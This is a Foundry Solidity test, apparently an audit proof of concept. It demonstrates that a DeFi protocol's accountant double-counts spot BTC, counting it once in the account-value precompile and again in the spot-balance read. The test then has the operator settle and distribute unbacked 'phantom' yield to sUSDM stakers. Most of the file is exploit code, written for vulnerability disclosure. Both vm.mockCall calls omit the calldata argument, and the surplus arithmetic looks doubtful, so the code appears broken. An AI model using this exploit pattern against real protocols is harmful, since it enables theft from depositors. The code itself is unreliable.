// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/simulator/SimulatorBase.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixConfig.sol";
import "../src/core/MonetrixVault.sol";
import "../src/tokens/sUSDM.sol";
import "../src/interfaces/HyperCoreConstants.sol";

contract AuditAgentPoC is SimulatorBase {
    // Precompile addresses based on HyperCore architecture
    address constant ACCOUNT_VALUE_SIGNED_PRECOMPILE = 0x000000000000000000000000000000000000080F;
    address constant SPOT_BALANCE_PRECOMPILE = 0x0000000000000000000000000000000000000801;

    // ATTACK TIMELINE:
    // 1. [Setup] SimulatorBase deploys the full protocol. We record the initial true backing.
    // 2. [T=1] Operator establishes a delta-neutral hedge. The perp account holds $1M USDC and $500K spot BTC as collateral.
    // 3. [T=2] The 0x80F accountValueSigned precompile returns $1.5M (aggregate margin including spot BTC).
    // 4. [T=3] The 0x801 spotBalance precompile returns $500K for the BTC spot index.
    // 5. [T=4] Accountant's _readL1Backing() adds both, resulting in $2.0M totalBackingSigned (double-counting the $500K spot).
    // 6. [T=5] Operator calls settle() with an inflated proposedYield based on the phantom $500K surplus.
    // 7. [Assert] Verify totalBackingSigned is inflated by exactly the spot amount, and yield injection succeeds with phantom funds.

    function test_exploit() public {
        // Step 1: Record initial state
        int256 initialBacking = accountant.totalBackingSigned();
        console.log("Step 1: Initial true backing =", uint256(initialBacking));

        // Step 2 & 3: Mock the 0x80F precompile to return aggregate margin INCLUDING spot hedge tokens
        // True economic value: $1,000,000 USDC + $500,000 spot BTC = $1,500,000 total account value
        uint256 trueAccountValue = 1_500_000e6; 
        uint256 spotHedgeValue = 500_000e6; // The $500K BTC that is ALREADY in the account value

        bytes memory accountValueReturn = abi.encode(int256(trueAccountValue));
        vm.mockCall(
            ACCOUNT_VALUE_SIGNED_PRECOMPILE,
            accountValueReturn
        );

        // Step 4: Mock the 0x801 precompile to return the spot balance for the whitelisted asset
        // The accountant will iterate tradeableAssets and read this SAME $500K balance again
        bytes memory spotBalanceReturn = abi.encode(uint64(spotHedgeValue));
        vm.mockCall(
            SPOT_BALANCE_PRECOMPILE,
            spotBalanceReturn
        );

        // Step 5: Read the inflated backing
        int256 inflatedBacking = accountant.totalBackingSigned();
        console.log("Step 5: Inflated backing after double-counting =", uint256(inflatedBacking));

        int256 phantomSurplus = inflatedBacking - initialBacking - int256(trueAccountValue);
        console.log("Phantom surplus from double-counting =", uint256(phantomSurplus));

        // ASSERT 1: Prove the double-counting occurred
        // The backing should only increase by trueAccountValue, but it increases by trueAccountValue + spotHedgeValue
        assertEq(
            phantomSurplus,
            int256(spotHedgeValue),
            "BUG: Spot hedge tokens are double-counted, inflating totalBackingSigned"
        );

        // Step 6: Exploit the inflated surplus to declare excess yield
        // The operator sees a massive surplus and calls settle() with the phantom amount
        uint256 excessYield = uint256(phantomSurplus);

        // Ensure settlement interval has passed
        vm.warp(block.timestamp + 1 days);

        vm.prank(operator);
        vault.settle(excessYield);

        // Step 7: Distribute the phantom yield to sUSDM stakers
        vm.prank(operator);
        vault.distributeYield();

        // ASSERT 2: Prove that phantom yield was successfully injected into sUSDM
        // This dilutes the USDM backing below 1:1 because the yield isn't backed by real USDC
        uint256 totalYieldInjected = susdm.totalYieldInjected();
        assertGe(
            totalYieldInjected,
            excessYield,
            "BUG: Phantom yield from double-counted spot tokens was injected into sUSDM, diluting USDM backing"
        );

        console.log("Step 7: Phantom yield injected into sUSDM =", totalYieldInjected);
    }
}
